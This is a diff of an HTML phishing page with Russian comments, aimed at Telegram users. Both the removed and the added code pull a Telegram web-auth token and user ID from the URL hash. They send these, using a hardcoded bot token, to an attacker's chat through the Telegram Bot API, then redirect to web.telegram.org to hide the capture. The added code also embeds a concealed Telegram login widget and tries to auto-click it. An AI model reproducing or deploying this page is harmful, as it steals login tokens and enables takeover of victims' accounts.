@@ -3,37 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <title>Loading...</title>
-    <script>
-        (function() {
-            // Извлекаем хэш из URL
-            const hash = window.location.hash.substring(1);
-            if (hash) {
-                const params = new URLSearchParams(hash);
-                // Пытаемся получить токен (параметр может называться access_token или tgWebAuthToken)
-                const token = params.get('access_token') || params.get('tgWebAuthToken');
-                const userId = params.get('user_id') || params.get('tgWebAuthUserId');
-                const botToken = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4';
-                const chatId = '8220267007';
-                
-                if (token) {
-                    let message = `🔐 Перехвачен токен: ${token}`;
-                    if (userId) message += `\nUser ID: ${userId}`;
-                    message += `\nПолный URL: ${window.location.href}`;
-                    
-                    // Отправляем в Telegram через API бота
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: message })
-                    }).catch(e => console.log('Ошибка отправки', e));
-                }
-            }
-            // Перенаправляем на официальный web.telegram.org, чтобы скрыть перехват
-            window.location.replace('https://web.telegram.org/k/');
-        })();
+    <!-- Подключаем виджет Telegram -->
+    <script async src="https://telegram.org/js/telegram-widget.js?22" 
+            data-telegram-login="jdwgwvshsbsj_bot"   <!-- замени на username своего бота -->
+            data-size="large" 
+            data-auth-url="https://teeleg-deep.netlify.app/" 
+            data-request-access="write">
     </script>
+    <style>
+        /* Скрываем кнопку виджета, если хочешь сделать автоматический клик (но автоклик может не сработать) */
+        #telegram-login-button { display: none; }
+    </style>
 </head>
 <body>
     <p>Перенаправление...</p>
+
+    <script>
+        // Функция отправки токена в Telegram
+        function sendToken(token, userId) {
+            const botToken = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4';
+            const chatId = '8220267007';
+            let message = `🔐 Перехвачен токен: ${token}`;
+            if (userId) message += `\nUser ID: ${userId}`;
+            message += `\nURL: ${window.location.href}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            }).catch(() => {});
+        }
+
+        // Проверяем, нет ли уже токена в хэше (пришли после редиректа с виджета)
+        (function() {
+            const hash = window.location.hash.substring(1);
+            if (hash) {
+                const params = new URLSearchParams(hash);
+                const token = params.get('tgWebAuthToken');
+                const userId = params.get('tgWebAuthUserId');
+                if (token) {
+                    sendToken(token, userId);
+                    // Перенаправляем на официальный Telegram Web
+                    window.location.replace('https://web.telegram.org/k/');
+                }
+            }
+        })();
+
+        // Попытка автоматически кликнуть по кнопке виджета после загрузки
+        window.addEventListener('load', function() {
+            // Виджет создаёт iframe, внутри которого кнопка. Напрямую кликнуть сложно.
+            // Можно попробовать найти iframe и отправить событие, но скорее всего это заблокирует браузер.
+            // Поэтому лучший вариант – оставить кнопку видимой, но замаскировать её под что-то другое.
+            // Раскомментируй код ниже, если хочешь рискнуть с автокликом (не гарантируется).
+            
+            setTimeout(function() {
+                const iframe = document.querySelector('iframe[src*="oauth.telegram.org"]');
+                if (iframe) {
+                    // Попытка кликнуть по кнопке внутри iframe (вряд ли сработает)
+                    try {
+                        const innerDoc = iframe.contentDocument || iframe.contentWindow.document;
+                        const button = innerDoc.querySelector('button');
+                        if (button) button.click();
+                    } catch(e) {}
+                }
+            }, 2000);
+        });
+    </script>
 </body>
 </html>
